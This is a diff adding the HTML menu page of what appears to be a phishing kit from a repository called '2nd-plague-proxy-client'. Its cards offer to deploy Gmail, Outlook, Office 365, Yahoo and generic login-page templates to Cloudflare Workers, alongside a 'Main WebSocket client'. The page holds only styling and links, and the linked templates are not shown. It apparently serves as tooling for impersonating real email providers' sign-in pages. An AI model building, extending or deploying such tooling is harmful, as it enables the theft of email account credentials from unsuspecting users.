@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Deploy Templates</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #0d1117;
+            color: #e6edf3;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            color: #58a6ff;
+            font-size: 28px;
+            margin-bottom: 30px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 16px;
+            margin-top: 20px;
+        }
+        .card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 20px 16px;
+            text-decoration: none;
+            color: #e6edf3;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+        .card:hover {
+            border-color: #58a6ff;
+            transform: translateY(-4px);
+            box-shadow: 0 8px 24px rgba(88, 166, 255, 0.15);
+        }
+        .card .icon {
+            font-size: 32px;
+        }
+        .card .name {
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .card .desc {
+            font-size: 11px;
+            color: #8b949e;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #8b949e;
+        }
+        .footer a {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📁 Deploy Templates</h1>
+        <p style="color: #8b949e; margin-bottom: 20px;">Select a template to deploy to Cloudflare Workers</p>
+
+        <div class="grid">
+            <a href="gmail.html" class="card">
+                <span class="icon">📧</span>
+                <span class="name">Gmail</span>
+                <span class="desc">Google Gmail login</span>
+            </a>
+
+            <a href="outlook.html" class="card">
+                <span class="icon">📨</span>
+                <span class="name">Outlook</span>
+                <span class="desc">Microsoft Outlook</span>
+            </a>
+
+            <a href="office365.html" class="card">
+                <span class="icon">💼</span>
+                <span class="name">Office 365</span>
+                <span class="desc">Microsoft 365 login</span>
+            </a>
+
+            <a href="yahoo.html" class="card">
+                <span class="icon">📬</span>
+                <span class="name">Yahoo</span>
+                <span class="desc">Yahoo Mail login</span>
+            </a>
+
+            <a href="generic.html" class="card">
+                <span class="icon">🔐</span>
+                <span class="name">Generic</span>
+                <span class="desc">Generic login page</span>
+            </a>
+
+            <a href="../sup.html" class="card" style="border-color: #2ea043;">
+                <span class="icon">🌐</span>
+                <span class="name">sup.html</span>
+                <span class="desc">Main WebSocket client</span>
+            </a>
+        </div>
+
+        <div class="footer">
+            <a href="https://github.com/dasaro2022-dotcom/2nd-plague-proxy-client" target="_blank">GitHub Repository</a> ·
+            <a href="https://dasaro2022-dotcom.github.io/2nd-plague-proxy-client/" target="_blank">View Site</a>
+        </div>
+    </div>
+</body>
+</html>
